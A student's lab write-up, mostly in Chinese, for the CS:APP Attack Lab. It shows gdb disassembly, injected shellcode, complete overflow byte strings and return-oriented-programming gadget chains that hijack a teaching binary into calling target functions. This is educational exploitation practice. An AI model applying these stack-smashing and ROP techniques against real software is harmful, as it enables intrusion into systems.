# LAB3 attack lab
## Part I: Code Injection Attacks 
### Level1 
读入字符串，通过test进入touch1。
```
(gdb) disas test
Dump of assembler code for function test:
   0x0000000000401968 <+0>:	sub    $0x8,%rsp
   0x000000000040196c <+4>:	mov    $0x0,%eax
   0x0000000000401971 <+9>:	callq  0x4017a8 <getbuf>
   0x0000000000401976 <+14>:	mov    %eax,%edx
   0x0000000000401978 <+16>:	mov    $0x403188,%esi
   0x000000000040197d <+21>:	mov    $0x1,%edi
   0x0000000000401982 <+26>:	mov    $0x0,%eax
   0x0000000000401987 <+31>:	callq  0x400df0 <__printf_chk@plt>
   0x000000000040198c <+36>:	add    $0x8,%rsp
   0x0000000000401990 <+40>:	retq   
End of assembler dump.
```
仔细看getbuf
```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.
```
根据`$0x28,%rsp`最大可读入39个字符串，结尾"\0"。
```
(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```
根据上述代码可知，touch1入口地址为`0x00000000004017c0` 。

故答案应为`40个任意字符 + c0 17 40 ` ，字符串结尾有00 。通过hex2raw创造超过128的字符
```
(gdb) r -q < exploit-raw.txt
Starting program: /home/kevin/csapp/lab3/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 
[Inferior 1 (process 3193) exited normally]
```
***
### Level2
题目要求：touch2传入的参数和cookie中的一样

思路：code injection. 输入的字符串中包含一段代码，代码的功能是将 %rdi 的数值置为和cookie中相同。

通过gcc 和 objdump 实现
```
0000000000000000 <.text>:
   0:	68 ec 17 40 00       	pushq  $0x4017ec	//栈中压入touch2的入口地址
   5:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi	//cookie的值
   c:	c3                   	retq   			//返回
```
exploit string 如下
```
68 ec 17 40 00
48 c7 c7 fa 97 b9 59
c3
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39 
30 31 32 33 34 35 36 
78 dc 61 55 	
```
最后的字符传为 buf的首地址，也是rsp 的地址。先通过ret返回插入的代码段，然后执行代码进入touch2
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 78 DC 61 55 
```
***
###Level3
exploit string 中有一段需要和cookie表示的字符相同，且函数传递的参数为字符串启始位置的地址

~ 栈中的内容会被后来的函数覆盖，即`0x5561dc78～0x5561dc98`
```
(gdb) x/12g 0x5561dc78
0x5561dc78:	0x0000000000000000	0x0000000000000000
0x5561dc88:	0x0000000000000000	0x0000000000000000
0x5561dc98:	0x0000000055586000	0x0000000000401976
0x5561dca8:	0x0000000000000009	0x0000000000401f24
0x5561dcb8:	0x0000000000000000	0xf4f4f4f4f4f4f4f4
0x5561dcc8:	0xf4f4f4f4f4f4f4f4	0xf4f4f4f4f4f4f4f4
```
但发现`0x5561dca8` 这里不会被覆盖，字符串长度为8（不计算\0），栈外的地址，buf缓存去外

故溢出覆盖产生的返回地址返回injection code
```
0000000000000000 <.text>:
   0:	68 fa 18 40 00       	pushq  $0x4018fa
   5:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi
   c:	c3                   	retq   
```
整个字符串应为
```
68 fa 18 40 00
48 c7 c7 a8 dc 61 55
c3 
30 31 32 33 34 35 36 37 38 39 
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61		//cookie

```
故结果
```
Cookie: 0x59b997fa
Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:ctarget:3:68 FA 18 40 00 48 C7 C7 A8 DC 61 55 C3 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 
```
***
## Part II: Return-Oriented Programming
###Level2
为了避免攻击，采用随机栈地址和只读只写的栈（不可执行code injection)。为此，产生了ROP方式通过ret现有程序，可以产生攻击

即现有程序中的截取部分段落会表示不同的含义
```
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
			48 89 c7 表示 mov rax,rdi 	90为空操作
  4019c9:	c3                   	retq   
```
通过objdump反汇编 rtarget 得到汇编代码
```
0000000000401994 <start_farm>:
  401994:	b8 01 00 00 00       	mov    $0x1,%eax
  401999:	c3                   	retq   

000000000040199a <getval_142>:
  40199a:	b8 fb 78 90 90       	mov    $0x909078fb,%eax
  40199f:	c3                   	retq   

00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3                   	retq   

00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   

00000000004019ae <setval_237>:
  4019ae:	c7 07 48 89 c7 c7    	movl   $0xc7c78948,(%rdi)
  4019b4:	c3                   	retq   

00000000004019b5 <setval_424>:
  4019b5:	c7 07 54 c2 58 92    	movl   $0x9258c254,(%rdi)
  4019bb:	c3                   	retq   

00000000004019bc <setval_470>:
  4019bc:	c7 07 63 48 8d c7    	movl   $0xc78d4863,(%rdi)
  4019c2:	c3                   	retq   

00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)	这一段
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>:
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax		58 pop rax
  4019cf:	c3                   	retq   

00000000004019d0 <mid_farm>:
  4019d0:	b8 01 00 00 00       	mov    $0x1,%eax
  4019d5:	c3                   	retq   
```
故在栈顶一次存放数据为
```
004019cc pop rax
59b997fa cookie值
004019c5 mov rax,rdi
touch2 地址
```
exploit string如下
```
30 31 32 33 34 35 36 37 38 39		//前40个任意字符填充
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
30 31 32 33 34 35 36 37 38 39
cc 19 40 00 00 00 00 00 
fa 97 b9 59 00 00 00 00 
c5 19 40 00 00 00 00 00
ec 17 40 00 00 00 00 00
```
结果为
```
Cookie: 0x59b997fa
Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
	user id	bovik
	course	15213-f15
	lab	attacklab
	result	1:PASS:0xffffffff:rtarget:2:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```
***
###Level3
solution: do not have time,[from internet](https://blog.csdn.net/qq_36894564/article/details/72863319)

先把%rsp存储的栈顶指针值复制给%rdi， 再将%eax的值设置为cookie字符串地址在栈中的偏移量并复制给%esi，最后将二者相加即为cookie字符串的存储地址。
```
mov   %rsp,%rax
ret
mov   %rax,%rdi
ret
popq  %rax         
ret                 
movl  %eax,%edx
ret
movl  %edx,%ecx
ret
movl  %ecx,%esi
ret
lea   (%rdi,%rsi,1),%rax
ret
mov   %rax,%rdi
ret
```



